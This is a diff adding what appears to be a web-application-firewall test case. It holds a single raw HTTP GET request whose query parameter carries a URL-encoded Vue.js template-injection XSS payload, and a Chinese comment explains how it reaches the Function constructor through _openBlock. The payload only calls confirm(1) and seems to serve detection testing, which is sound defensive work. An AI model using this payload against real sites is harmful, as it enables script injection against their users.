@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_框架_VueJS-06506744
+# 使用 @ 符号来绑定事件处理程序，通过调用 _openBlock 的构造函数的构造函数，构造了一个新的函数对象。然后，通过调用该函数对象的方式来执行其中的代码。
+GET /?id=%3Cx%20@%5B_openBlock.constructor%60confirm%281%29%60%28%29%5D%3E&bid=hd_tag_m8mv25eg HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25eg
+RM-PRO-Token: 3c954d4b448cfdf19d678c1ab9485324
+RM-PRO-Time: 1742808463483
+User-Agent: curl/7.83.1
+
